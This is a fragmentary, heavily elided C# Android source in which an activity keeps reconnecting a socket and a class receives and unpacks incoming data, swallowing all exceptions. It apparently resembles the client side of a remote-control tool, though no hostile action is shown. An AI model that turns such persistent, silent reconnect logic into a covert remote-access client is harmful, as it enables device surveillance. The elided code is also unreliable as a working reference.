...
namespace Task2
{
    ...
    */
    ...
    public class MainActivity : Activity
    {
        ...
        List<Upload> upList = new List<Upload>();
        public async void Baglanti_Kur()
        {
            await Task.Run(async() =>
            {
                ...
                catch (Exception) { await Task.Delay(1000); Baglanti_Kur();  }
            });
        }
        /// <summary>
        ...
        public class infoAl : IDisposable
        {
            ...
            public infoAl(Socket sckInf, MainActivity frm1)
            {
                ...
                tmp_form = frm1;
                tmp = sckInf;
                sckInf.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, endRead, sckInf); // classic socket receive operation.
            }
            public async void endRead(IAsyncResult ar)
            {
                try
                {
                    ...
                    int readed = scServer.EndReceive(ar); // classic socket async result operation.
                    if (readed > 0)
                    {
                        ...
                        try
                        {
                            ...
                            await UnPacker(scServer, memos);
                        }
                        catch (Exception) { }
                    }
                    await Task.Delay(1); // reduce high cpu usage. :)
                    scServer.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, endRead, scServer);
                }
                catch (Exception)
                {
                    ...
                    {
                        if (Soketimiz != null) { Soketimiz.Dispose(); }
                        ...
                        tmp_form.SetKeepAlive(Soketimiz, 2000, 1000);
                        tmp_form.Baglanti_Kur();
                    }
                }
            }
